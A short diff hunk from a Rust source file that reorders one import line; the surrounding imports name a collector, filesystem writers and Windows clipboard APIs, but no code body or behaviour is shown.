@@ -4,7 +4,7 @@ use collector::Collector;
 use core::ptr::{null_mut, slice_from_raw_parts};
 use filesystem::path::Path;
 use filesystem::{FileSystem, WriteTo};
-use tasks::{parent_name, Task};
+use tasks::{Task, parent_name};
 use windows_sys::Win32::System::DataExchange::{CloseClipboard, GetClipboardData, OpenClipboard};
 use windows_sys::Win32::System::Memory::{GlobalLock, GlobalUnlock};
 
